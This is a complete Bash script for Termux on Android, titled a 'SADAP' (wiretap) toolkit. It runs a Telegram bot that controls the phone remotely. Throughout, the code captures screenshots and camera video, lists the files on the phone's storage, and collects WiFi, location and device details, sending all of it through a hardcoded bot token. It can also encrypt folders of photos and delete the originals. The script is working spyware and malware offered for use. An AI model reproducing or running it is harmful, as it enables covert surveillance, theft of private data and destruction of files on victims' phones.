#!/data/data/com.termux/files/usr/bin/bash
# HOZOO MD - FULL SADAP TOOLKIT + TELEGRAM BOT v6
# Private AI Build - Unfiltered Edition
# Date: 2026-01-02 | Update: 2026-11-15
# FITUR: Auto Install Module, Auto Storage, Clear, Inline Keyboard

clear
echo -e "\033[1;32m=========================================="
echo -e "   HOZOO MD - SADAP + BOT TELEGRAM v6"
echo -e "   [AUTO INSTALL] [AUTO STORAGE]"
echo -e "   [INLINE KEYBOARD] [HIJAU/MERAH]"
echo -e "==========================================\033[0m"

# ================= KONFIGURASI =================
BOT_TOKEN="9085010947:AAEhNTa-pL2YYZ_Nvwd-hlhstwqM0IT6XGI"
API="https://api.telegram.org/bot${BOT_TOKEN}"
PASS="HozooMD2026"
LOG_DIR="$HOME/hozoo_data"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/activity.log"
SCREEN_DIR="$LOG_DIR/screenshots"
VIDEO_DIR="$LOG_DIR/videos"
FILES_DIR="$LOG_DIR/scanned_files"
RECV_DIR="$LOG_DIR/received"
mkdir -p "$SCREEN_DIR" "$VIDEO_DIR" "$FILES_DIR" "$RECV_DIR"

ALLOWED_USERS="$LOG_DIR/allowed.txt"
touch "$ALLOWED_USERS"

# Warna
GREEN='\033[1;32m'
RED='\033[1;31m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
NC='\033[0m'

log() { echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"; }
err() { log "ERROR: $1"; echo -e "${RED}[-] $1${NC}" >&2; }
ok()  { echo -e "${GREEN}[+] $1${NC}"; }
info() { echo -e "${CYAN}[*] $1${NC}"; }
warn() { echo -e "${YELLOW}[!] $1${NC}"; }

# ================= AUTO INSTALL MODULE =================
install_module() {
    local pkg_name="$1"
    local cmd_check="${2:-$1}"
    local method="${3:-pkg}"

    if command -v "$cmd_check" &>/dev/null; then
        ok "$pkg_name sudah terinstall."
        return 0
    fi

    info "Menginstall $pkg_name..."
    case "$method" in
        pkg)
            pkg install -y "$pkg_name" >/dev/null 2>&1
            ;;
        pip)
            pip install "$pkg_name" >/dev/null 2>&1
            ;;
        npm)
            npm install -g "$pkg_name" >/dev/null 2>&1
            ;;
    esac

    if command -v "$cmd_check" &>/dev/null; then
        ok "$pkg_name berhasil diinstall."
        return 0
    else
        warn "$pkg_name gagal diinstall via $method."
        return 1
    fi
}

auto_install_modules() {
    echo -e "${CYAN}=========================================="
    echo -e "   INSTALL MODULE OTOMATIS"
    echo -e "==========================================${NC}"

    # ===== PAKET WAJIB (pkg) =====
    local pkgs=(
        "curl:curl"
        "jq:jq"
        "openssl:openssl"
        "wget:wget"
        "tar:tar"
        "xz-utils:xz"
        "python:python"
        "nodejs:node"
        "git:git"
        "nano:nano"
        "vim:vim"
    )

    for item in "${pkgs[@]}"; do
        local pkg="${item%%:*}"
        local cmd="${item##*:}"
        install_module "$pkg" "$cmd" "pkg"
    done

    # ===== TERMUX API (Khusus) =====
    local termux_cmds=(
        "termux-api:termux-screenshot"
        "termux-api:termux-camera-record"
        "termux-api:termux-torch"
        "termux-api:termux-battery-status"
        "termux-api:termux-wifi-connectioninfo"
        "termux-api:termux-wifi-scaninfo"
        "termux-api:termux-telephony-deviceinfo"
        "termux-api:termux-data-usage"
        "termux-api:termux-wallpaper"
    )

    for item in "${termux_cmds[@]}"; do
        local pkg="${item%%:*}"
        local cmd="${item##*:}"
        if ! command -v "$cmd" &>/dev/null; then
            install_module "$pkg" "$cmd" "pkg"
            break
        fi
    done

    # ===== PIP MODULES =====
    if command -v pip &>/dev/null; then
        local pip_mods=("requests:requests" "pillow:PIL" "pycryptodome:Crypto")
        for item in "${pip_mods[@]}"; do
            local mod="${item%%:*}"
            local check="${item##*:}"
            python -c "import $check" 2>/dev/null && ok "pip:$mod sudah ada" || install_module "$mod" "pip3" "pip"
        done
    fi

    # ===== NODE MODULES (opsional) =====
    if command -v npm &>/dev/null; then
        if ! command -v yt-dlp &>/dev/null; then
            info "Menginstall yt-dlp via pip..."
            pip install yt-dlp >/dev/null 2>&1
            command -v yt-dlp &>/dev/null && ok "yt-dlp terinstall." || warn "yt-dlp gagal."
        fi
    fi

    echo -e "${GREEN}=========================================="
    echo -e "   INSTALL SELESAI"
    echo -e "==========================================${NC}"
}

# ================= AUTO STORAGE =================
auto_storage() {
    if [ ! -d "$HOME/storage" ]; then
        info "Setup storage otomatis..."
        echo "y" | termux-setup-storage 2>/dev/null
        sleep 1
        [ -d "$HOME/storage" ] && ok "Storage OK" || warn "Storage gagal, buka manual: termux-setup-storage"
    else
        ok "Storage sudah OK."
    fi
}

# ================= CEK DEPENDENSI FINAL =================
cekin_deps() {
    local miss=()
    for cmd in curl jq openssl wget termux-screenshot termux-camera-record termux-torch termux-battery-status; do
        command -v "$cmd" &>/dev/null || miss+=("$cmd")
    done
    if [ ${#miss[@]} -gt 0 ]; then
        err "Missing: ${miss[*]}"
        warn "Coba jalankan ulang script atau install manual."
        exit 1
    fi
    ok "Semua dependency utama tersedia."
}

# ================= API HELPERS =================
send_msg() {
    local chat_id="$1" text="$2"
    curl -s -X POST "${API}/sendMessage" \
        --data-urlencode "chat_id=${chat_id}" \
        --data-urlencode "text=${text}" \
        -d "parse_mode=Markdown" >/dev/null
}

send_menu_keyboard() {
    local chat_id="$1"
    local keyboard='{
        "inline_keyboard": [
            [{"text": "📸 SS", "callback_data": "cmd_ss"}, {"text": "🎥 VID", "callback_data": "cmd_vid"}],
            [{"text": "📂 SCAN", "callback_data": "cmd_scan"}, {"text": "🌐 IP", "callback_data": "cmd_ip"}],
            [{"text": "📶 WIFI", "callback_data": "cmd_wifi"}, {"text": "📊 HP", "callback_data": "cmd_hp"}],
            [{"text": "🔦 ON", "callback_data": "cmd_on"}, {"text": "🔦 OFF", "callback_data": "cmd_off"}],
            [{"text": "🖼️ WALLPAPER", "callback_data": "cmd_wallpaper"}, {"text": "⬇️ DLV", "callback_data": "cmd_dlvid"}],
            [{"text": "🔒 LOCK", "callback_data": "cmd_lock"}, {"text": "🔓 UNLOCK", "callback_data": "cmd_unlock"}],
            [{"text": "🔐 ENC FOTO", "callback_data": "cmd_encfoto"}, {"text": "🔓 DEC FOTO", "callback_data": "cmd_decfoto"}],
            [{"text": "⬇️ NODEJS", "callback_data": "cmd_nodejs"}, {"text": "❌ TUTUP", "callback_data": "cmd_close"}]
        ]
    }'
    local text="🔥 *HOZOO MD v6 - MENU* 🔥

🟢 *HIJAU* = Aksi Langsung
🔴 *MERAH* = Aksi Khusus
━━━━━━━━━━━━━━━━━━
📸 SS = Screenshot
🎥 VID = Rekam Video
📂 SCAN = Scan File
🌐 IP = IP & Lokasi
📶 WIFI = Info WiFi
📊 HP = Status HP
🔦 ON/OFF = Senter
🖼️ WALLPAPER = Ganti Wallpaper
⬇️ DLV = Download Video
🔒 LOCK = Kunci File
🔓 UNLOCK = Buka Kunci
🔐 ENC FOTO = Enkripsi Foto
🔓 DEC FOTO = Pulihkan Foto
⬇️ NODEJS = Download Node.js
❌ TUTUP = Hapus Keyboard"

    curl -s -X POST "${API}/sendMessage" \
        --data-urlencode "chat_id=${chat_id}" \
        --data-urlencode "text=${text}" \
        -d "parse_mode=Markdown" \
        -d "reply_markup=${keyboard}" >/dev/null
}

send_file() { local chat_id="$1" fp="$2" cap="$3"; [ -f "$fp" ] && curl -s -X POST "${API}/sendDocument" -F "chat_id=${chat_id}" -F "document=@${fp}" -F "caption=${cap}" >/dev/null || send_msg "$chat_id" "❌ File ga ada: $fp"; }
send_photo() { local chat_id="$1" fp="$2"; [ -f "$fp" ] && curl -s -X POST "${API}/sendPhoto" -F "chat_id=${chat_id}" -F "photo=@${fp}" >/dev/null || send_msg "$chat_id" "❌ File ga ada: $fp"; }
send_video() { local chat_id="$1" fp="$2"; [ -f "$fp" ] && curl -s -X POST "${API}/sendVideo" -F "chat_id=${chat_id}" -F "video=@${fp}" >/dev/null || send_msg "$chat_id" "❌ File ga ada: $fp"; }

tg_download() {
    local file_id="$1" out_path="$2"
    local resp=$(curl -s "${API}/getFile?file_id=${file_id}")
    local fpath=$(echo "$resp" | jq -r '.result.file_path // empty')
    [ -z "$fpath" ] && { err "getFile failed"; return 1; }
    curl -s -o "$out_path" "https://api.telegram.org/file/bot${BOT_TOKEN}/${fpath}"
    [ -f "$out_path" ] && [ -s "$out_path" ] && return 0 || return 1
}

# ================= FUNGSI UTAMA =================
ambil_screenshot() {
    local chat_id="$1" fname="${SCREEN_DIR}/shot_$(date +%s%N).png"
    if termux-screenshot "$fname" 2>/dev/null && [ -f "$fname" ]; then
        send_photo "$chat_id" "$fname"
        send_msg "$chat_id" "✅ *HIJAU* SS: \`$(basename "$fname")\` ($(du -h "$fname"|cut -f1))"
        log "ss: $fname"
    else send_msg "$chat_id" "❌ *MERAH* Gagal SS. Aktifkan izin Termux:API."; fi
}

rekam_video() {
    local chat_id="$1" dur="${2:-5}" cam="${3:-0}"
    [[ "$dur" =~ ^[0-9]+$ ]] || dur=5; [[ "$cam" =~ ^[0-9]+$ ]] || cam=0
    local fname="${VIDEO_DIR}/vid_$(date +%s%N).mp4"
    send_msg "$chat_id" "🎥 Rekam ${dur}s cam${cam}..."
    if termux-camera-record -c "$cam" -d "$dur" "$fname" 2>/dev/null && [ -f "$fname" ]; then
        send_video "$chat_id" "$fname"
        send_msg "$chat_id" "✅ *HIJAU* Video: $(basename "$fname") ($(du -h "$fname"|cut -f1))"
        log "video: $fname"
    else send_msg "$chat_id" "❌ *MERAH* Gagal rekam. Cek izin kamera."; fi
}

scan_file() {
    local chat_id="$1" out="${FILES_DIR}/file_list_$(date +%s).txt"
    send_msg "$chat_id" "📂 Scan /sdcard..."
    find /sdcard -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.mp4" -o -iname "*.mkv" -o -iname "*.pdf" -o -iname "*.doc*" -o -iname "*.zip" -o -iname "*.apk" -o -iname "*.js" -o -iname "*.json" \) 2>/dev/null > "$out"
    local count=$(wc -l < "$out" 2>/dev/null || echo 0)
    if [ "$count" -gt 0 ]; then send_file "$chat_id" "$out" "📄 *HIJAU* ${count} file ditemukan"
    else send_msg "$chat_id" "❌ *MERAH* Ga ada file / izin storage belum aktif."; fi
    log "scan: $count file"
}

info_ip() {
    local chat_id="$1" pub_ip=$(curl -s --max-time 10 https://api.ipify.org)
    local geo=$(curl -s --max-time 10 "http://ip-api.com/json/${pub_ip}?fields=status,country,regionName,city,zip,lat,lon,isp,org,as,query" | jq -c . 2>/dev/null)
    local local_ip=$(ifconfig 2>/dev/null | grep -E "inet " | grep -v "127.0.0.1" | awk '{print $2}' | paste -sd, -)
    send_msg "$chat_id" "🌐 *IP & LOKASI* 🟢
📡 Publik: \`${pub_ip}\`
🏠 Lokal: \`${local_ip:-N/A}\`
📊:
\`\`\`
${geo:-gagal}
\`\`\`"
}

info_wifi() {
    local chat_id="$1" conn=$(termux-wifi-connectioninfo 2>/dev/null | jq -c .)
    local scan=$(termux-wifi-scaninfo 2>/dev/null | jq -r '.[] | "\(.ssid) | \(.bssid) | \(.level)dBm"' 2>/dev/null | head -15)
    send_msg "$chat_id" "📶 *WIFI* 🟢

Sekarang:
\`\`\`
${conn:-N/A}
\`\`\`

Sekitar:
\`\`\`
${scan:-N/A}
\`\`\`"
}

info_kuota() {
    local chat_id="$1" bat=$(termux-battery-status 2>/dev/null | jq -c .)
    local dev=$(termux-telephony-deviceinfo 2>/dev/null | jq -c . 2>/dev/null || echo "N/A")
    local data_usage=$(termux-data-usage 2>/dev/null | jq -c . 2>/dev/null || echo "N/A")
    send_msg "$chat_id" "📊 *STATUS HP* 🟢
🔋: \`\`\`${bat:-N/A}\`\`\`
📱: \`\`\`${dev}\`\`\`
📶: \`\`\`${data_usage}\`\`\`"
}

senter_on()  { termux-torch on  2>/dev/null && send_msg "$1" "🔦 *HIJAU* ON" || send_msg "$1" "❌ *MERAH* gagal senter ON"; }
senter_off() { termux-torch off 2>/dev/null && send_msg "$1" "🔦 *HIJAU* OFF" || send_msg "$1" "❌ *MERAH* gagal senter OFF"; }

ubah_wallpaper() {
    local chat_id="$1" url="$2" f="${LOG_DIR}/wall_$(date +%s).jpg"
    [ -z "$url" ] && { send_msg "$chat_id" "❌ *MERAH* /wallpaper <url>"; return; }
    wget -q -O "$f" "$url" && [ -s "$f" ] && termux-wallpaper -f "$f" 2>/dev/null && send_msg "$chat_id" "✅ *HIJAU* Wallpaper diganti." || send_msg "$chat_id" "❌ *MERAH* Gagal ganti wallpaper."
}

download_video() {
    local chat_id="$1" url="$2" out="$HOME/storage/downloads/hozoo_$(date +%s).mp4"
    [ -z "$url" ] && { send_msg "$chat_id" "❌ *MERAH* /dlvid <url>"; return; }
    mkdir -p "$HOME/storage/downloads"; send_msg "$chat_id" "⬇️ Download..."
    if command -v yt-dlp &>/dev/null; then yt-dlp -q -o "$out" "$url" 2>/dev/null; else wget -q -O "$out" "$url" 2>/dev/null; fi
    if [ -f "$out" ] && [ -s "$out" ]; then send_file "$chat_id" "$out" "✅ *HIJAU* Video: $(basename "$out")"; else send_msg "$chat_id" "❌ *MERAH* Gagal download."; fi
}

dl_nodejs() {
    local chat_id="$1" out="$HOME/node.tar.xz"
    send_msg "$chat_id" "⬇️ Download Node.js ARM64..."
    if wget -q --show-progress -O "$out" "https://nodejs.org/dist/v20.18.0/node-v20.18.0-linux-arm64.tar.xz"; then
        send_file "$chat_id" "$out" "✅ *HIJAU* Node.js. Extract: tar -xf node.tar.xz"; log "nodejs: $out"
    else send_msg "$chat_id" "❌ *MERAH* Gagal download Node.js."; fi
}

# ================= ENKRIPSI =================
kunci_file() { local chat_id="$1" src="$2" pw="$3"; [ -z "$src" ] || [ -z "$pw" ] && { send_msg "$chat_id" "❌ *MERAH* /lock <path> <pw>"; return; }; [ -f "$src" ] && openssl enc -aes-256-cbc -salt -pbkdf2 -in "$src" -out "${src}.HOZOO" -pass pass:"$pw" 2>/dev/null && rm -f "$src" && send_msg "$chat_id" "🔒 *HIJAU* \`${src}.HOZOO\`" || send_msg "$chat_id" "❌ *MERAH* Gagal enkripsi."; }
buka_kunci() { local chat_id="$1" src="$2" pw="$3"; [ -z "$src" ] || [ -z "$pw" ] && { send_msg "$chat_id" "❌ *MERAH* /unlock <path> <pw>"; return; }; [ -f "$src" ] && local out="${src%.HOZOO}" && openssl enc -d -aes-256-cbc -pbkdf2 -in "$src" -out "$out" -pass pass:"$pw" 2>/dev/null && rm -f "$src" && send_msg "$chat_id" "🔓 *HIJAU* \`${out}\`" || send_msg "$chat_id" "❌ *MERAH* Password salah."; }

enkripsi_foto() {
    local chat_id="$1" folder="$2" pw="$3" count=0
    [ -z "$folder" ] || [ -z "$pw" ] && { send_msg "$chat_id" "❌ *MERAH* /encfoto <folder> <pw>"; return; }
    shopt -s nullglob; for img in "$folder"/*.{jpg,jpeg,png,webp}; do [ -f "$img" ] || continue; openssl enc -aes-256-cbc -salt -pbkdf2 -in "$img" -out "${img}.ENC" -pass pass:"$pw" 2>/dev/null && rm -f "$img" && count=$((count+1)); done; shopt -u nullglob
    send_msg "$chat_id" "🔐 *HIJAU* Selesai. ${count} foto -> .ENC"
}

pemulihan_foto() {
    local chat_id="$1" folder="$2" pw="$3" count=0
    [ -z "$folder" ] || [ -z "$pw" ] && { send_msg "$chat_id" "❌ *MERAH* /decfoto <folder> <pw>"; return; }
    shopt -s nullglob; for enc in "$folder"/*.ENC; do [ -f "$enc" ] || continue; local out="${enc%.ENC}"; openssl enc -d -aes-256-cbc -pbkdf2 -in "$enc" -out "$out" -pass pass:"$pw" 2>/dev/null && rm -f "$enc" && count=$((count+1)); done; shopt -u nullglob
    send_msg "$chat_id" "🔓 *HIJAU* Selesai. ${count} foto dipulihkan."
}

# ================= CALLBACK & FILE MASUK =================
handle_callback() {
    local callback_id="$1" chat_id="$2" data="$3"
    curl -s -X POST "${API}/answerCallbackQuery" -d "callback_query_id=${callback_id}" >/dev/null
    case "$data" in
        cmd_ss) clear; ambil_screenshot "$chat_id" ;;
        cmd_vid) clear; rekam_video "$chat_id" 5 0 ;;
        cmd_scan) clear; scan_file "$chat_id" ;;
        cmd_ip) clear; info_ip "$chat_id" ;;
        cmd_wifi) clear; info_wifi "$chat_id" ;;
        cmd_hp) clear; info_kuota "$chat_id" ;;
        cmd_on) clear; senter_on "$chat_id" ;;
        cmd_off) clear; senter_off "$chat_id" ;;
        cmd_wallpaper) clear; send_msg "$chat_id" "❌ *MERAH* Kirim URL: /wallpaper <url>" ;;
        cmd_dlvid) clear; send_msg "$chat_id" "❌ *MERAH* Kirim URL: /dlvid <url>" ;;
        cmd_lock) clear; send_msg "$chat_id" "❌ *MERAH* Format: /lock <path> <pw>" ;;
        cmd_unlock) clear; send_msg "$chat_id" "❌ *MERAH* Format: /unlock <path> <pw>" ;;
        cmd_encfoto) clear; send_msg "$chat_id" "❌ *MERAH* Format: /encfoto <folder> <pw>" ;;
        cmd_decfoto) clear; send_msg "$chat_id" "❌ *MERAH* Format: /decfoto <folder> <pw>" ;;
        cmd_nodejs) clear; dl_nodejs "$chat_id" ;;
        cmd_close) clear; curl -s -X POST "${API}/editMessageReplyMarkup" -d "chat_id=${chat_id}" -d "message_id=$(echo "$4" | jq -r '.message.message_id')" -d "reply_markup={\"inline_keyboard\":[]}" >/dev/null; send_msg "$chat_id" "✅ *HIJAU* Keyboard ditutup." ;;
        *) send_msg "$chat_id" "❌ *MERAH* Tombol ga dikenal." ;;
    esac
}

handle_incoming_file() {
    local chat_id="$1" update="$2" msg=$(echo "$update" | jq -c '.message')
    local file_id="" file_name="" file_type=""
    if echo "$msg" | jq -e '.photo' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.photo[-1].file_id'); file_type="photo"; file_name="photo_$(date +%s).jpg"
    elif echo "$msg" | jq -e '.video' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.video.file_id'); file_type="video"; file_name=$(echo "$msg" | jq -r '.video.file_name // "video_'"$(date +%s)"'.mp4"')
    elif echo "$msg" | jq -e '.document' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.document.file_id'); file_type="document"; file_name=$(echo "$msg" | jq -r '.document.file_name // "doc_'"$(date +%s)"'"')
    elif echo "$msg" | jq -e '.audio' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.audio.file_id'); file_type="audio"; file_name=$(echo "$msg" | jq -r '.audio.file_name // "audio_'"$(date +%s)"'.mp3"')
    elif echo "$msg" | jq -e '.voice' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.voice.file_id'); file_type="voice"; file_name="voice_$(date +%s).ogg"
    elif echo "$msg" | jq -e '.sticker' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.sticker.file_id'); file_type="sticker"; file_name="sticker_$(date +%s).webp"
    elif echo "$msg" | jq -e '.video_note' >/dev/null 2>&1; then file_id=$(echo "$msg" | jq -r '.video_note.file_id'); file_type="video_note"; file_name="vnote_$(date +%s).mp4"
    else return 1; fi
    [ -z "$file_id" ] && return 1
    file_name=$(echo "$file_name" | tr -cd 'A-Za-z0-9._-')
    local save_path="${RECV_DIR}/${file_type}_$(date +%s)_${file_name}"
    send_msg "$chat_id" "📥 Menerima ${file_type}..."
    if tg_download "$file_id" "$save_path"; then
        send_msg "$chat_id" "✅ *HIJAU* Tersimpan!
📁 \`$(basename "$save_path")\`
📦 $(du -h "$save_path" | cut -f1)
📍 \`${RECV_DIR}\`"
        log "recv: $save_path"
    else send_msg "$chat_id" "❌ *MERAH* Gagal download file."; log "recv failed: $file_id"; fi
    return 0
}

# ================= BOT LOOP =================
bot_loop() {
    local resp=$(curl -s "${API}/getMe")
    if ! echo "$resp" | jq -e '.ok' >/dev/null 2>&1; then err "Token invalid: $resp"; exit 1; fi
    ok "Bot aktif: @$(echo "$resp" | jq -r '.result.username')"
    log "=== BOT STARTED v6 ==="
    local offset=0
    while true; do
        local updates=$(curl -s --max-time 35 "${API}/getUpdates?offset=${offset}&timeout=30")
        if ! echo "$updates" | jq -e '.ok' >/dev/null 2>&1; then sleep 3; continue; fi
        while IFS= read -r update; do
            [ -z "$update" ] && continue
            local update_id=$(echo "$update" | jq -r '.update_id // empty')
            local chat_id=$(echo "$update" | jq -r '.message.chat.id // empty')
            local callback_id=$(echo "$update" | jq -r '.callback_query.id // empty')
            local callback_data=$(echo "$update" | jq -r '.callback_query.data // empty')
            local callback_chat_id=$(echo "$update" | jq -r '.callback_query.message.chat.id // empty')
            local msg_text=$(echo "$update" | jq -r '.message.text // empty')
            [ -n "$update_id" ] && offset=$((update_id + 1))
            if [ -n "$callback_id" ] && [ -n "$callback_data" ]; then handle_callback "$callback_id" "$callback_chat_id" "$callback_data" "$update"; continue; fi
            [ -z "$chat_id" ] && continue
            grep -qx "$chat_id" "$ALLOWED_USERS" 2>/dev/null || { echo "$chat_id" >> "$ALLOWED_USERS"; send_msg "$chat_id" "✅ *HIJAU* Terdaftar. Ketik /menu."; }
            if [ -z "$msg_text" ]; then handle_incoming_file "$chat_id" "$update" && continue; fi
            local -a args; read -ra args <<< "$msg_text"
            local cmd="${args[0]}"; cmd="${cmd%%@*}"; cmd="${cmd,,}"
            case "$cmd" in
                /start|/menu) clear; send_menu_keyboard "$chat_id" ;;
                /ss|/screenshot) clear; ambil_screenshot "$chat_id" ;;
                /vid|/video) clear; rekam_video "$chat_id" "${args[1]}" "${args[2]}" ;;
                /scan) clear; scan_file "$chat_id" ;;
                /ip) clear; info_ip "$chat_id" ;;
                /wifi) clear; info_wifi "$chat_id" ;;
                /hp) clear; info_kuota "$chat_id" ;;
                /on) clear; senter_on "$chat_id" ;;
                /off) clear; senter_off "$chat_id" ;;
                /wallpaper) clear; ubah_wallpaper "$chat_id" "${args[1]}" ;;
                /dlvid) clear; download_video "$chat_id" "${args[1]}" ;;
                /nodejs) clear; dl_nodejs "$chat_id" ;;
                /lock) clear; kunci_file "$chat_id" "${args[1]}" "${args[2]}" ;;
                /unlock) clear; buka_kunci "$chat_id" "${args[1]}" "${args[2]}" ;;
                /encfoto) clear; enkripsi_foto "$chat_id" "${args[1]}" "${args[2]}" ;;
                /decfoto) clear; pemulihan_foto "$chat_id" "${args[1]}" "${args[2]}" ;;
                *) handle_incoming_file "$chat_id" "$update" || send_msg "$chat_id" "❓ *MERAH* Ga dikenal. /menu" ;;
            esac
        done < <(echo "$updates" | jq -c '.result[]' 2>/dev/null)
        sleep 1
    done
}

# ================= MAIN =================
clear
auto_install_modules
auto_storage
cekin_deps
clear
echo -e "${GREEN}[*] Memulai HOZOO MD v6...${NC}"
bot_loop
